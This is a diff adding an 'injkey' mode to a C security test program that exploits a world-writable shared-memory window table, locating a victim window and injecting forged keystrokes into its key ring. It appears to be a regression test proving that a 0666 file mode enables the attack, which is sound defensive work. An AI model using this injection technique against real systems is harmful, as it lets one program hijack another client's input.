@@ -34,18 +34,146 @@
  * proves the technique works.  Run against the 0644 chrome segment the
  * IDENTICAL code is refused by the kernel.  One test, one program, two files,
  * and the only difference between the two runs is the file mode.
+ *
+ * A SECOND MODE, `injkey`, measures the third attack the split leaves open:
+ * injecting into another client's key ring.  Retitling and scene-scribbling
+ * are in-place byte overwrites the generic mode above already does; a ring is
+ * different, because a reader only sees bytes between its r and w counters, so
+ * an injection has to WRITE the event AND advance w.  That needs the window
+ * table's layout, which a hostile program simply reads out of this open-source
+ * header -- so this mode mirrors struct wwin (below) exactly, finds the victim
+ * row by its title with the same memmem the generic mode uses, and pokes a key
+ * line into that row's `keys` ring.  It prints the wid and pid it read back
+ * out of the row it landed on, so a layout drift shows up as a mismatch the
+ * harness asserts on rather than as a silent write into the wrong place.
+ *
+ *   wsys_bypass injkey <path> <victim-title> <keyline>
+ *
+ * The mirror MUST track user/linux-wsys.c's struct wwin / struct wring /
+ * WSYS_RING_CAP byte-for-byte; if it stops, the injected bytes land at the
+ * wrong offset, the protocol read of /dev/wsys/<wid>/keys comes back without
+ * them, and tests/linux/wsys_bypass.sh's assertion fails loudly.
  */
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
+#include <stddef.h>
+#include <stdint.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
 #include <unistd.h>
 
+/* ---- the mirror, tracking user/linux-wsys.c exactly --------------------- */
+#define WSYS_RING_CAP     8192
+#define WSYS_SCENE_CAP    16384
+#define WSYS_TITLE_CAP    64
+#define WSYS_MAX_WINDOWS  256
+
+struct m_wring {
+    uint32_t r, w;
+    uint8_t  b[WSYS_RING_CAP];
+};
+
+struct m_wwin {
+    uint32_t used;
+    int32_t  wid;
+    int32_t  pid;
+    int32_t  x, y, w, h, z;
+    int32_t  decorate, visible, proto;
+    int32_t  pinned;
+    int32_t  wmdelete;
+    int32_t  keyed, blend;
+    uint32_t scene_len;
+    uint32_t scene_gen;
+    uint32_t stage_len;
+    char     title[WSYS_TITLE_CAP];
+    uint8_t  scene[WSYS_SCENE_CAP];
+    uint8_t  stage[WSYS_SCENE_CAP];
+    struct m_wring keys, pointer, event, text, cmd;
+};
+
+/* Enough of struct wshm to index win[] -- the header before it, then the
+ * array.  The sink[] table after win[] is not mirrored: nothing here indexes
+ * past win[]. */
+struct m_wshm {
+    uint32_t magic, version;
+    int32_t  focus_wid, next_wid, desktop;
+    uint32_t gen, inputgen;
+    struct m_wwin win[WSYS_MAX_WINDOWS];
+};
+
+/* injkey <path> <victim> <keyline>: find a window row, then write
+ * "<keyline>\n" into its `keys` ring and advance the ring's w.  <victim> is
+ * either a title byte run (found with the same memmem the generic overwrite
+ * uses) or "wid=<n>" (walk win[] for that wid) -- a hostile program reading
+ * this open-source header can do either, and the wid form is what the caller
+ * needs when a title is shared by a reaped row.  Prints found=/wid=/pid=/wrote=
+ * so the caller can confirm the injection landed on the row it meant to.  Same
+ * MAP_SHARED write path as the generic mode, so the 0666 mode is the whole
+ * reason it works. */
+static int inject_key(const char *tag, const char *path,
+                      const char *victim, const char *keyline)
+{
+    printf("== %s", tag);
+
+    struct stat st;
+    if (stat(path, &st) != 0) { printf(" stat=-%d\n", errno); return 0; }
+    printf(" mode=0%o uid=%d", (unsigned)(st.st_mode & 07777), (int)st.st_uid);
+
+    int fd = open(path, O_RDWR);
+    printf(" open_rdwr=%d", fd >= 0 ? fd : -errno);
+    if (fd < 0) { printf(" found=0 wrote=0\n"); return 0; }
+
+    size_t len = (size_t)st.st_size;
+    void  *m   = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    printf(" mmap_rw=%s", m == MAP_FAILED ? "FAIL" : "0");
+    if (m == MAP_FAILED) { printf(" found=0 wrote=0\n"); close(fd); return 0; }
+
+    struct m_wwin *v = NULL;
+    if (strncmp(victim, "wid=", 4) == 0) {
+        /* Walk the window array for the target wid, exactly as a program that
+         * had read struct wshm would. */
+        int want = atoi(victim + 4);
+        struct m_wshm *s = (struct m_wshm *)m;
+        for (int i = 0; i < WSYS_MAX_WINDOWS; i++) {
+            if (s->win[i].used && s->win[i].wid == want) { v = &s->win[i]; break; }
+        }
+    } else {
+        /* The title is a plain byte run in the row, so finding it IS finding
+         * the row: back up from the title field to the head of struct wwin. */
+        void *hit = memmem(m, len, victim, strlen(victim));
+        if (hit)
+            v = (struct m_wwin *)((uint8_t *)hit - offsetof(struct m_wwin, title));
+    }
+
+    int found = v != NULL, wrote = 0;
+    printf(" found=%d", found);
+    if (found) {
+        printf(" wid=%d pid=%d", v->wid, v->pid);
+        struct m_wring *q = &v->keys;
+        size_t n = strlen(keyline);
+        for (size_t i = 0; i < n; i++)
+            q->b[q->w++ % WSYS_RING_CAP] = (uint8_t)keyline[i];
+        q->b[q->w++ % WSYS_RING_CAP] = '\n';    /* the ring is line-framed */
+        msync(m, len, MS_SYNC);
+        wrote = 1;
+    }
+    printf(" wrote=%d\n", wrote);
+    munmap(m, len);
+    close(fd);
+    return 0;
+}
+
 int main(int argc, char **argv)
 {
+    /* injkey <path> <victim-title> <keyline> [tag] */
+    if (argc >= 5 && strcmp(argv[1], "injkey") == 0)
+        return inject_key(argc >= 6 ? argv[5] : "injkey.table",
+                          argv[2], argv[3], argv[4]);
+
     if (argc < 5) {
         fprintf(stderr, "usage: wsys_bypass <tag> <path> <needle> <repl>\n");
         return 2;
